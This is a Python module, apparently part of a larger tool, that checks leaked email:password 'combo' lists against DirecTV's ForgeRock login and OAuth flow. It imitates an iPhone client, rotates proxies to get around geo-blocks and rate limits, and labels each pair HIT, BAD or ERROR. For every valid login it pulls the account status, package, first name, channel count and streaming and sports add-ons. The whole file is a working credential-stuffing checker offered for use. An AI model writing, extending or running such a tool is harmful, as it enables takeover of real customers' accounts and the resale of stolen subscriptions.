"""DirectTV account checker using identity.directv.com ForgeRock auth flow."""

from __future__ import annotations

import base64
import hashlib
import json
import re
import secrets
import uuid
from dataclasses import dataclass
from typing import Any
from urllib.parse import quote, urlencode

import httpx

from .proxy import with_rotating_session

IDENTITY_BASE = "https://identity.directv.com"
TOKEN_URL = "https://api.cld.dtvce.com/authn-tokengo/v3"
ACCOUNT_INFO_URL = "https://api.cld.dtvce.com/profile/information/basicinfogo/service"
CHANNELS_URL = "https://api.cld.dtvce.com/discovery/metadata/channel/v5/service/allchannels"
SVOD_PROVIDERS_URL = "https://api.cld.dtvce.com/discovery/edge/svodprovider/v1/service/providers"
SUBSCRIPTIONS_URL = "https://api.cld.dtvce.com/account/purchase/gateway/v2/account/subscriptions"
SALES_CHANNEL = "ffp-apple"

CLIENT_ID = "UNIFIED_iOS_Mobile"
FR_CLIENT_ID = "fr_iOS_mobile_02"
REDIRECT_URI = "https://stream.directv.com/auth-return"
USER_AGENT = (
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
)

ACTIVE_STATUSES = {"ACTV", "ACTIVE", "A"}

PACKAGE_ADDON_KEYWORDS = {
    "peacock": "Peacock",
    "netflix": "Netflix",
    "hulu": "Hulu",
    "disney": "Disney+",
    "max": "Max",
    "hbo": "HBO",
    "showtime": "Showtime",
    "starz": "Starz",
    "cinemax": "Cinemax",
    "espn": "ESPN",
    "paramount": "Paramount+",
    "discovery": "Discovery+",
    "amc": "AMC+",
    "sports": "Sports",
    "protection plan": "Protection Plan",
    "nfl": "NFL",
    "mlb": "MLB",
    "nba": "NBA",
    "nhl": "NHL",
    "sunday ticket": "NFL Sunday Ticket",
    "extra innings": "MLB Extra Innings",
    "league pass": "League Pass",
}

SPORTS_REGION_MARKERS = {
    "BIG10HD": "Big Ten",
    "BTN2OF": "Big Ten",
    "BTN3OF": "Big Ten",
    "BTN4OF": "Big Ten",
    "BG10O2H": "Big Ten",
    "BGTN3HD": "Big Ten",
    "BGTN4HD": "Big Ten",
    "MLB": "MLB",
    "NFL": "NFL",
    "NBA": "NBA",
    "NHL": "NHL",
    "SUNDAY TICKET": "NFL Sunday Ticket",
    "EXTRA INNINGS": "MLB Extra Innings",
    "LEAGUE PASS": "League Pass",
    "SEC": "SEC Network",
    "GOLF": "Golf",
    "TENNIS": "Tennis",
    "SOCCER": "Soccer",
    "FIGHT": "Fight Network",
    "RSN": "Regional Sports",
}

SPORTS_CHANNEL_PATTERNS = [
    (re.compile(r"mlb extra innings", re.I), "MLB Extra Innings"),
    (re.compile(r"nfl sunday ticket", re.I), "NFL Sunday Ticket"),
    (re.compile(r"nba league pass", re.I), "NBA League Pass"),
    (re.compile(r"nhl center ice", re.I), "NHL Center Ice"),
    (re.compile(r"espn\+", re.I), "ESPN+"),
    (re.compile(r"sec network", re.I), "SEC Network"),
    (re.compile(r"big ten", re.I), "Big Ten"),
    (re.compile(r"peacock", re.I), "Peacock"),
    (re.compile(r"showtime", re.I), "Showtime"),
    (re.compile(r"starz", re.I), "Starz"),
    (re.compile(r"cinemax", re.I), "Cinemax"),
    (re.compile(r"\bhbo\b", re.I), "HBO"),
]

_UNSET = object()


@dataclass
class CheckResult:
    email: str
    password: str
    status: str
    active: bool | None = None
    account_status: str | None = None
    account_type: str | None = None
    package: str | None = None
    first_name: str | None = None
    channels: int | None = None
    svod_addons: list[str] | None = None
    sports_packages: list[str] | None = None
    addons: list[str] | None = None
    error: str | None = None

    def to_data(self) -> dict[str, Any]:
        return {
            "active": self.active,
            "account_status": self.account_status,
            "account_type": self.account_type,
            "package": self.package,
            "first_name": self.first_name,
            "channels": self.channels,
            "svod_addons": self.svod_addons,
            "sports_packages": self.sports_packages,
            "addons": self.addons,
            "error": self.error,
        }

    def format_line(self) -> str:
        if self.status == "HIT":
            active_label = "Yes" if self.active else "No"
            package = self.package or "Unknown"
            extras = []
            if self.account_type:
                extras.append(f"type={self.account_type}")
            if self.first_name:
                extras.append(f"name={self.first_name}")
            if self.channels is not None:
                extras.append(f"channels={self.channels}")
            if self.svod_addons:
                extras.append(f"streaming={', '.join(self.svod_addons)}")
            elif self.svod_addons is not None:
                extras.append("streaming=none")
            if self.sports_packages:
                extras.append(f"sports={', '.join(self.sports_packages)}")
            if self.addons:
                extras.append(f"addons={', '.join(self.addons)}")
            extra = f" | {' | '.join(extras)}" if extras else ""
            return (
                f"{self.email}:{self.password} | HIT | Active: {active_label} | "
                f"Package: {package}{extra}"
            )
        if self.status == "BAD":
            return f"{self.email}:{self.password} | BAD | Invalid credentials"
        if self.status == "ERROR":
            return f"{self.email}:{self.password} | ERROR | {self.error or 'Unknown error'}"
        return f"{self.email}:{self.password} | {self.status}"


class DTVChecker:
    def __init__(self, timeout: float = 30.0) -> None:
        self.timeout = timeout

    def check(
        self,
        email: str,
        password: str,
        *,
        proxy: str | None = None,
        rotate_proxy: bool = True,
    ) -> CheckResult:
        proxy_url = proxy
        if proxy_url and rotate_proxy:
            proxy_url = with_rotating_session(proxy_url)

        device_id = str(uuid.uuid4()).upper()
        device_class_id = str(uuid.uuid4()).upper()
        device_profile = json.dumps({"identifier": device_id, "metadata": {}})
        code_verifier = secrets.token_urlsafe(43)
        code_challenge = (
            base64.urlsafe_b64encode(hashlib.sha256(code_verifier.encode()).digest())
            .rstrip(b"=")
            .decode()
        )
        state = json.dumps({"loginSessionId": secrets.token_hex(8)})

        oauth_params = {
            "response_type": "code",
            "client_id": CLIENT_ID,
            "fr_client_id": FR_CLIENT_ID,
            "redirect_uri": REDIRECT_URI,
            "code_challenge": code_challenge,
            "code_challenge_method": "S256",
            "deviceProfileInfo": device_profile,
            "state": quote(state),
            "logout": "false",
        }
        referer = f"{IDENTITY_BASE}/weblogin/authenticate?{urlencode(oauth_params)}"
        auth_headers = {
            "User-Agent": USER_AGENT,
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-API-Version": "resource=2.0, protocol=1.0",
            "client_id": FR_CLIENT_ID,
            "X-DTV-Device-Profile": device_profile,
            "Content-Type": "application/json",
            "Origin": IDENTITY_BASE,
            "Referer": referer,
        }
        form_headers = {
            "User-Agent": USER_AGENT,
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Accept": "application/json",
        }

        try:
            with httpx.Client(
                follow_redirects=False,
                timeout=self.timeout,
                proxy=proxy_url,
            ) as client:
                client.get(referer, headers={"User-Agent": USER_AGENT})

                login_error = self._forge_rock_login(client, auth_headers, email, password)
                if login_error:
                    if login_error == "invalid_credentials":
                        return CheckResult(email, password, "BAD")
                    if login_error == "geo_blocked":
                        return CheckResult(
                            email,
                            password,
                            "ERROR",
                            error="Geo blocked — US residential proxy required",
                        )
                    return CheckResult(email, password, "ERROR", error=login_error)

                auth_code = self._get_auth_code(client, code_challenge, state)
                if not auth_code:
                    return CheckResult(email, password, "ERROR", error="OAuth authorization failed")

                token_resp = self._exchange_token(
                    client,
                    form_headers,
                    device_class_id,
                    auth_code,
                    code_verifier,
                )
                access_token = token_resp.get("access_token")
                if not access_token:
                    return CheckResult(
                        email,
                        password,
                        "ERROR",
                        error=token_resp.get("errorDescription")
                        or token_resp.get("error")
                        or "Token exchange failed",
                    )

                value_pairs = token_resp.get("valuePairs", {})
                api_headers = {
                    "Authorization": f"Bearer {access_token}",
                    "User-Agent": USER_AGENT,
                    "Accept": "application/json",
                    "X-DTV-Device-Profile": device_profile,
                    "Content-Type": "application/json",
                }

                info = self._get_account_info(client, api_headers)
                channel_data = self._get_channel_data(client, api_headers)
                channels = channel_data.get("size")
                channel_names = channel_data.get("channel_names", [])

                account_status = info.get("accountStatus")
                package = (
                    info.get("packageDisplayCode")
                    or info.get("packageCode")
                    or info.get("pkgCode")
                )
                active = (
                    str(account_status).upper() in ACTIVE_STATUSES
                    if account_status
                    else None
                )

                svod_addons = self._get_svod_addons(client, api_headers)
                stream_addons = self._get_stream_subscriptions(client, api_headers, email)
                package_addons = self._extract_package_addons(package)
                sports_packages = self._detect_sports_packages(
                    package,
                    channel_data.get("aggregated_location_ids", ""),
                    channel_names,
                )
                addons = self._merge_addons(stream_addons, package_addons, sports_packages, svod_addons)

                return CheckResult(
                    email=email,
                    password=password,
                    status="HIT",
                    active=active,
                    account_status=account_status,
                    account_type=info.get("accountType") or value_pairs.get("accountType"),
                    package=package,
                    first_name=value_pairs.get("firstName"),
                    channels=int(channels) if channels is not None else None,
                    svod_addons=svod_addons,
                    sports_packages=sports_packages,
                    addons=addons,
                )
        except httpx.HTTPError as exc:
            return CheckResult(email, password, "ERROR", error=str(exc))

    @staticmethod
    def _auth_blocked(response: httpx.Response) -> bool:
        location = (response.headers.get("location") or "").lower()
        if response.status_code in {301, 302, 303, 307, 308}:
            if "traveling" in location or "account-help" in location:
                return True
        body = response.text[:500].lower()
        return "account-help-while-traveling" in body or "<!doctype html" in body

    def _forge_rock_login(
        self,
        client: httpx.Client,
        headers: dict[str, str],
        email: str,
        password: str,
    ) -> str | None:
        response = client.post(f"{IDENTITY_BASE}/am/IdPwdAuth", headers=headers, content=b"")
        if self._auth_blocked(response):
            return "geo_blocked"
        data = self._json_or_error(response)
        if "authId" not in data:
            if self._auth_blocked(response):
                return "geo_blocked"
            return data.get("message") or "Auth init failed"

        payload = {
            "authId": data["authId"],
            "callbacks": [
                {
                    "type": "NameCallback",
                    "output": [{"name": "prompt", "value": "User Name"}],
                    "input": [{"name": "IDToken1", "value": email}],
                    "_id": 0,
                }
            ],
        }
        response = client.post(f"{IDENTITY_BASE}/am/IdPwdAuth", headers=headers, json=payload)
        data = self._json_or_error(response)
        if "authId" not in data:
            return data.get("message") or "Username step failed"

        auth_id = data["authId"]
        callbacks: list[dict[str, Any]] = []
        for callback in data.get("callbacks", []):
            item = dict(callback)
            if callback.get("type") == "PasswordCallback":
                item["input"] = [{"name": "IDToken2", "value": password}]
            callbacks.append(item)

        response = client.post(
            f"{IDENTITY_BASE}/am/IdPwdAuth",
            headers=headers,
            json={"authId": auth_id, "callbacks": callbacks},
        )
        data = self._json_or_error(response)

        if data.get("tokenId"):
            client.cookies.set("iPlanetDirectoryPro", data["tokenId"], domain=".directv.com")
            return None

        for callback in data.get("callbacks", []):
            if callback.get("type") != "TextOutputCallback":
                continue
            for output in callback.get("output", []):
                if output.get("name") != "message":
                    continue
                message = output.get("value", "")
                if "invalid username or password" in message.lower():
                    return "invalid_credentials"
                try:
                    parsed = json.loads(message)
                    if parsed.get("code") == 201:
                        return "invalid_credentials"
                except json.JSONDecodeError:
                    pass
                return message or "Login failed"

        return data.get("message") or "Login failed"

    def _get_auth_code(
        self,
        client: httpx.Client,
        code_challenge: str,
        state: str,
    ) -> str | None:
        params = urlencode(
            {
                "scope": "read",
                "response_type": "code",
                "client_id": FR_CLIENT_ID,
                "redirect_uri": REDIRECT_URI,
                "code_challenge": code_challenge,
                "code_challenge_method": "S256",
                "state": state,
            }
        )
        response = client.get(
            f"{IDENTITY_BASE}/authorize?{params}",
            headers={"User-Agent": USER_AGENT},
        )
        location = response.headers.get("location", "")
        match = re.search(r"code=([^&]+)", location)
        return match.group(1) if match else None

    def _exchange_token(
        self,
        client: httpx.Client,
        headers: dict[str, str],
        device_class_id: str,
        auth_code: str,
        code_verifier: str,
    ) -> dict[str, Any]:
        body = urlencode(
            {
                "clientID": CLIENT_ID,
                "deviceClassID": device_class_id,
                "clientMake": "Apple",
                "clientModel": "iPhone",
                "authCode": auth_code,
                "codeVerifier": code_verifier,
                "returnURL": REDIRECT_URI,
            }
        )
        body += "&reqParams=DEVICEID&reqParams=AUTHGROUPS"
        response = client.post(
            f"{TOKEN_URL}/tokens?clientID={CLIENT_ID}",
            headers=headers,
            content=body,
        )
        return self._json_or_error(response)

    def _get_account_info(self, client: httpx.Client, headers: dict[str, str]) -> dict[str, Any]:
        response = client.get(ACCOUNT_INFO_URL, headers=headers)
        if response.status_code != 200:
            return {}
        return self._json_or_error(response)

    def _get_channel_data(self, client: httpx.Client, headers: dict[str, str]) -> dict[str, Any]:
        response = client.get(CHANNELS_URL, headers=headers)
        if response.status_code != 200:
            return {}
        data = self._json_or_error(response)
        channel_names = [
            channel.get("channelName", "")
            for channel in data.get("channelInfoList", [])
            if channel.get("channelName")
        ]
        return {
            "size": data.get("size"),
            "aggregated_location_ids": data.get("aggregatedLocationIds", ""),
            "channel_names": channel_names,
        }

    def _get_svod_addons(self, client: httpx.Client, headers: dict[str, str]) -> list[str]:
        response = client.get(SVOD_PROVIDERS_URL, headers=headers)
        if response.status_code != 200:
            return []
        data = self._json_or_error(response)
        addons = []
        for provider in data.get("svodProvider", []):
            if provider.get("subscription"):
                title = provider.get("title")
                if title:
                    addons.append(title)
        return sorted(set(addons))

    def _get_stream_subscriptions(
        self,
        client: httpx.Client,
        headers: dict[str, str],
        email: str,
    ) -> list[str]:
        response = client.post(
            SUBSCRIPTIONS_URL,
            headers=headers,
            json={"salesChannel": SALES_CHANNEL, "accessId": email},
        )
        if response.status_code != 200:
            return []
        data = self._json_or_error(response)
        addons = []
        for product in data.get("products", []):
            status = str(product.get("status", "")).upper()
            if status not in {"ACTIVE", "ACTV", "SUBSCRIBED"}:
                continue
            name = (
                product.get("displayName")
                or product.get("tierDisplayName")
                or product.get("billingProductCode")
                or product.get("package")
            )
            if name:
                addons.append(str(name))
        return sorted(set(addons))

    @staticmethod
    def _extract_package_addons(package: str | None) -> list[str]:
        if not package:
            return []
        normalized = package.replace("_", " ").lower()
        found = []
        for keyword, label in PACKAGE_ADDON_KEYWORDS.items():
            if keyword in normalized:
                found.append(label)
        return sorted(set(found))

    @staticmethod
    def _detect_sports_packages(
        package: str | None,
        region_blob: str,
        channel_names: list[str],
    ) -> list[str]:
        found: list[str] = []
        search_space = f"{package or ''} {region_blob}".upper()
        for marker, label in SPORTS_REGION_MARKERS.items():
            if marker in search_space:
                found.append(label)

        for channel_name in channel_names:
            for pattern, label in SPORTS_CHANNEL_PATTERNS:
                if pattern.search(channel_name):
                    found.append(label)

        return sorted(set(found))

    @staticmethod
    def _merge_addons(
        stream_addons: list[str],
        package_addons: list[str],
        sports_packages: list[str],
        svod_addons: list[str],
    ) -> list[str]:
        merged = []
        for group in (stream_addons, svod_addons, sports_packages, package_addons):
            for item in group:
                if item and item not in merged:
                    merged.append(item)
        return merged

    @staticmethod
    def _json_or_error(response: httpx.Response) -> dict[str, Any]:
        try:
            payload = response.json()
            if isinstance(payload, dict):
                return payload
        except json.JSONDecodeError:
            pass
        return {"message": response.text[:300], "status_code": response.status_code}


def parse_combo(line: str) -> tuple[str, str] | None:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if ":" not in line:
        return None
    email, password = line.split(":", 1)
    email = email.strip()
    password = password.strip()
    if not email or not password:
        return None
    return email, password


def probe_geo_blocked(*, proxy: str | None = None, timeout: float = 20.0) -> bool:
    """Return True when DIRECTV identity endpoints geo-block this IP."""
    device_id = str(uuid.uuid4()).upper()
    device_profile = json.dumps({"identifier": device_id, "metadata": {}})
    code_verifier = secrets.token_urlsafe(43)
    code_challenge = (
        base64.urlsafe_b64encode(hashlib.sha256(code_verifier.encode()).digest())
        .rstrip(b"=")
        .decode()
    )
    state = json.dumps({"loginSessionId": secrets.token_hex(8)})
    oauth_params = {
        "response_type": "code",
        "client_id": CLIENT_ID,
        "fr_client_id": FR_CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "code_challenge": code_challenge,
        "code_challenge_method": "S256",
        "deviceProfileInfo": device_profile,
        "state": quote(state),
        "logout": "false",
    }
    referer = f"{IDENTITY_BASE}/weblogin/authenticate?{urlencode(oauth_params)}"
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-API-Version": "resource=2.0, protocol=1.0",
        "client_id": FR_CLIENT_ID,
        "X-DTV-Device-Profile": device_profile,
        "Content-Type": "application/json",
        "Origin": IDENTITY_BASE,
        "Referer": referer,
    }
    proxy_url = proxy
    if proxy_url:
        proxy_url = with_rotating_session(proxy_url)
    try:
        with httpx.Client(follow_redirects=False, timeout=timeout, proxy=proxy_url) as client:
            client.get(referer, headers={"User-Agent": USER_AGENT})
            response = client.post(f"{IDENTITY_BASE}/am/IdPwdAuth", headers=headers, content=b"")
            if DTVChecker._auth_blocked(response):
                return True
            data = DTVChecker._json_or_error(response)
            return "authId" not in data and DTVChecker._auth_blocked(response)
    except httpx.HTTPError:
        return False


def check_account(
    email: str,
    password: str,
    *,
    proxy: str | None | object = _UNSET,
    timeout: float = 45.0,
) -> CheckResult:
    checker = DTVChecker(timeout=timeout)
    proxy_value = None if proxy is _UNSET else proxy
    return checker.check(email, password, proxy=proxy_value)
